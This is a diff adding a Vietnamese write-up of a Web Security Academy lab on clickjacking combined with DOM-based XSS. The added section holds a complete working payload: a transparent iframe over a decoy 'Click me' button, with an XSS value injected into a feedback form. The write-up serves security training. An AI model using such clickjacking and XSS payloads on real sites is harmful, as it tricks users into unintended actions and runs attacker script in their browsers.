@@ -126,3 +126,41 @@ Dùng payload sau: (Khác phần trước ở chỗ dùng thêm thuộc tính `s
 LAB SOLVED!
 
 <img width="576" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7c5249ba-2882-4164-a1d9-94bc58fba983">
+
+***
+
+## 4. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
+
+* Content:
+```
+This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.
+```
+*Exploit:
+
+Dùng payload sau:
+
+```
+<style>
+    iframe {
+        position:relative;
+        width: 700px;
+        height: 1000px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 850px;
+        left: 60px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://0a8a00f80303c4c480124e8f00b3006e.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=wiener%40admin-user.net&subject=3&message=4"></iframe>
+```
+
+<img width="318" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1c0d4bfb-b81d-487b-9ac0-55ef5d016b70">
+
+LAB SOLVED!
+
+<img width="581" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3725fcce-9957-48f9-a4a3-cd2301b16da5">
